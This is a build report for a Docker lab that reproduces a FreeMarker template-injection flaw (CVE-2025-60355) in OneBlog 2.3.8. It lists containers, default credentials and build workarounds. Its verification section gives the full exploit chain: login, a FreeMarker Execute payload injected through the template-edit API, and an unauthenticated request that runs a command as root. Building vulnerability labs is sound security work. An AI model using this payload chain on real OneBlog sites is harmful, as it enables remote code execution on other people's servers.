# Lab Build Report: CVE-2025-60355

## Lab Architecture

OneBlog 2.3.8 FreeMarker Server-Side Template Injection (SSTI) lab environment consisting of 4 containers:

```
┌──────────────────┐     ┌──────────────────┐
│  cve-60355-admin │     │  cve-60355-web   │
│  (blog-admin)    │     │  (blog-web)      │
│  Port: 8085      │     │  Port: 8443      │
│  Injection Point │     │  Trigger Point   │
└────────┬─────────┘     └────────┬─────────┘
         │                         │
    ┌────┴─────────────────────────┴────┐
    │         cve-60355-net             │
    ├───────────────┬───────────────────┤
    │               │                   │
┌───┴──────────┐  ┌─┴────────────────┐
│cve-60355-mysql│  │cve-60355-redis   │
│ MariaDB 10.11│  │ Redis 7 Alpine   │
│ Port: 3306   │  │ Port: 6379       │
└──────────────┘  └──────────────────┘
```

### Container Roles
| Container | Image | Role | Internal Port |
|-----------|-------|------|---------------|
| `cve-60355-redis` | `redis:7-alpine` | Session management (Shiro) and caching | 6379 |
| `cve-60355-mysql` | `cve-60355-mysql` (built from MariaDB 10.11) | Database with schema + seed data | 3306 |
| `cve-60355-admin` | `cve-60355-admin` (built from Eclipse Temurin JRE 8) | Admin backend — template edit API (injection point) | 8085 |
| `cve-60355-web` | `cve-60355-web` (built from Eclipse Temurin JRE 8) | Public frontend — `/robots.txt` (trigger point) | 8443 |

---

## Container Details

### cve-60355-redis
- **Image**: `redis:7-alpine`
- **Password**: `oneblog123456`
- **Healthcheck**: `redis-cli -a oneblog123456 ping`
- **Network**: `cve-60355-net`

### cve-60355-mysql
- **Base Image**: `mariadb:10.11` (MySQL 5.7 compatible, supports ARM64)
- **Root Password**: `root`
- **Database**: `dblog` (auto-created by init scripts)
- **Init Scripts**: `01-dblog.sql` (schema), `02-init_data.sql` (seed data with users, templates, permissions)
- **Healthcheck**: `mariadb -u root -proot -e "SELECT 1"`
- **Network**: `cve-60355-net`

### cve-60355-admin
- **Base Image**: `eclipse-temurin:8-jre-jammy`
- **Application**: `blog-admin.jar` (Spring Boot 2.3.5.RELEASE)
- **Port**: 8085 (exposed to host)
- **Environment**: Configured via `.env` file (MySQL/Redis connection, kaptcha disabled)
- **Purpose**: Admin API — provides `POST /passport/signin` (auth) and `POST /template/edit` (SSTI injection)
- **Network**: `cve-60355-net`

### cve-60355-web
- **Base Image**: `eclipse-temurin:8-jre-jammy`
- **Application**: `blog-web.jar` (Spring Boot 2.3.5.RELEASE)
- **Port**: 8443 (exposed to host)
- **Environment**: Configured via `.env` file (MySQL/Redis connection)
- **Purpose**: Public frontend — provides `GET /robots.txt` (SSTI trigger, unauthenticated)
- **Network**: `cve-60355-net`

---

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Maven build (source → JARs) | ✅ SUCCESS | Built from commit `8669276` (v2.3.8) using `maven:3.8.6-openjdk-8-slim` |
| `cve-60355-mysql` image | ✅ SUCCESS | MariaDB 10.11 with schema + seed data |
| `cve-60355-redis` | ✅ SUCCESS | Redis 7 Alpine (pulled) |
| `cve-60355-admin` image | ✅ SUCCESS | Eclipse Temurin JRE 8 + blog-admin.jar (59MB) |
| `cve-60355-web` image | ✅ SUCCESS | Eclipse Temurin JRE 8 + blog-web.jar (59MB) |

### Workarounds Applied
1. **MySQL 5.7 → MariaDB 10.11**: MySQL 5.7 Docker image does not support ARM64 (linux/arm64/v8). Replaced with MariaDB 10.11 which is MySQL-compatible and supports ARM64.
2. **openjdk:8-jre-slim → eclipse-temurin:8-jre-jammy**: OpenJDK 8 slim image was removed from Docker Hub. Replaced with Eclipse Temurin JRE 8 (Jammy) which supports ARM64.
3. **init_data.sql prefix**: Added `USE dblog;` to the beginning of `init_data.sql` because MariaDB entrypoint runs each init script in a separate session.

---

## Start/Stop Commands

```bash
# Start the lab
docker compose -f docker-compose.yml up -d

# Check status
docker compose -f docker-compose.yml ps

# View logs
docker compose -f docker-compose.yml logs -f

# Stop the lab
docker compose -f docker-compose.yml down

# Full reset (including database volumes)
docker compose -f docker-compose.yml down -v
```

---

## Verification

### All containers running
```
NAME              IMAGE             STATUS                    PORTS
cve-60355-admin   cve-60355-admin   Up (running)              0.0.0.0:8085->8085/tcp
cve-60355-mysql   cve-60355-mysql   Up (healthy)              3306/tcp
cve-60355-redis   redis:7-alpine    Up (healthy)              6379/tcp
cve-60355-web     cve-60355-web     Up (running)              0.0.0.0:8443->8443/tcp
```

### Service accessibility
- **blog-admin**: HTTP 302 on `GET /` (redirect to login page) ✅
- **blog-web**: HTTP 200 on `GET /robots.txt` with rendered FreeMarker content ✅
- **Login**: `POST /passport/signin` with `root`/`123456` returns `{"status":200}` ✅

### Vulnerability Confirmed (End-to-End SSTI → RCE)

1. **Login**: `POST /passport/signin` with `username=root&password=123456&rememberMe=true` → `{"status":200}`
2. **Inject SSTI**: `POST /template/edit` with `id=4&refValue=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` → `{"status":200,"message":"操作成功！"}`
3. **Trigger RCE**: `GET /robots.txt` (unauthenticated) → **`uid=0(root) gid=0(root) groups=0(root)`**

The response body contains the output of the `id` command, confirming Remote Code Execution via FreeMarker SSTI.

---

## Default Credentials

| Username | Password | Role | Has template:edit? |
|----------|----------|------|--------------------|
| root | 123456 | ROOT (superadmin) | ✅ Yes |
| admin | 123456 | ADMIN | Yes |
| comment-admin | 123456 | COMMENT ADMIN | Likely no |

---

## Network Configuration

To access containers via Docker:
```bash
# Get container IPs
ADMIN_IP=$(docker inspect cve-60355-admin --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
WEB_IP=$(docker inspect cve-60355-web --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Access services
curl "http://${ADMIN_IP}:8085/passport/signin" -d "username=root&password=123456&rememberMe=true"
curl "http://${WEB_IP}:8443/robots.txt"
```

---

## Lab Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Orchestration file for all 4 services |
| `.env` | Environment variables (MySQL/Redis config, kaptcha disabled) |
| `Dockerfile.mysql` | MariaDB 10.11 image with schema + seed data |
| `Dockerfile.admin` | Runtime image for blog-admin (Eclipse Temurin JRE 8) |
| `Dockerfile.web` | Runtime image for blog-web (Eclipse Temurin JRE 8) |
| `Dockerfile.builder` | Builder image (Maven + JDK 8, used to compile JARs) |
| `blog-admin.jar` | Pre-built blog-admin Spring Boot JAR (v2.3.8, 59MB) |
| `blog-web.jar` | Pre-built blog-web Spring Boot JAR (v2.3.8, 59MB) |
| `dblog.sql` | Database schema (tables for sys_template, sys_user, etc.) |
| `init_data.sql` | Seed data (default users, templates, permissions) |

---

## Known Issues

1. **ARM64 only**: The current images use `eclipse-temurin:8-jre-jammy` and `mariadb:10.11` which are ARM64-native. For AMD64 hosts, the original `mysql:5.7` and `openjdk:8-jre-slim` could be used instead.
2. **Spring Boot startup time**: Java apps take ~20-30 seconds to fully initialize after container start. Wait for "博客部署完成" in logs before testing.
3. **Redis cache**: `ONEBLOG_ENABLE_REDIS_CACHE=false` is set in `.env` to avoid caching issues during PoC testing. Template changes take effect immediately.
4. **Template persistence**: SSTI payloads persist in the database. After testing, restore the original TM_ROBOTS template or reset the database with `docker compose down -v && docker compose up -d`.
